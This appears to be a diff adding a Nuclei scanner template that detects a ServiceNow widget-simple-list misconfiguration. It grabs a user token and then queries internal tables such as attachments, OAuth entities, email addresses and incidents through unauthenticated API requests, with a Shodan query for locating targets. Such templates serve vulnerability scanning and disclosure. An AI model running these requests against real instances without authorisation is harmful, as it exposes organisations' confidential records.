@@ -1,0 +1,88 @@
+http:
+- extractors:
+  - group: 1
+    internal: true
+    name: user-token
+    regex:
+    - var g_ck = '([0-9a-z]+)'
+    type: regex
+  - group: 1
+    part: body
+    regex:
+    - '"count":([0-9]+),'
+    type: regex
+  matchers:
+  - condition: and
+    part: body
+    type: word
+    words:
+    - '"isValid":true'
+    - '"count":'
+  - part: body
+    regex:
+    - '"display_value":"(.*)",'
+    type: regex
+  matchers-condition: and
+  payloads:
+    table_list:
+    - t=kb_knowledge&f=text
+    - t=cmdb_model&f=name
+    - t=cmn_department&f=app_name
+    - t=licensable_app&f=app_name
+    - t=alm_asset&f=display_name
+    - t=sys_attachment&f=file_name
+    - t=sys_attachment_doc&f=data
+    - t=oauth_entity&f=name
+    - t=cmn_cost_center&f=name
+    - t=cmdb_model&f=name
+    - t=sc_cat_item&f=name
+    - t=sn_admin_center_application&f-name
+    - t=cmn_company&f=name
+    - t=sys_email_attachment&f=email
+    - t=sys_email_attachment&f=attachment
+    - t=cmn_notif_device&f=email_address
+    - t=sys_portal_age&f=display_name
+    - t=incident&f=short_description
+  raw:
+  - '@once
+
+    GET / HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+  - '@once
+
+    GET /login.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    '
+  - 'POST /api/now/sp/widget/widget-simple-list?{{table_list}} HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Accept: application/json
+
+    X-UserToken: {{user-token}}
+
+    Content-Type: application/json
+
+
+    {}
+
+    '
+id: servicenow-widget-misconfig
+info:
+  author: DhiyaneshDk
+  metadata:
+    max-request: 54
+    shodan-query: title:"servicenow"
+    verified: true
+  name: ServiceNow Widget-Simple-List - Misconfiguration
+  reference:
+  - https://github.com/bsysop/servicenow
+  - https://twitter.com/ConspiracyProof/status/1713270026046685272
+  - https://www.enumerated.ie/servicenow-data-exposure
+  severity: unknown
+  tags: servicenow,widget,misconfig
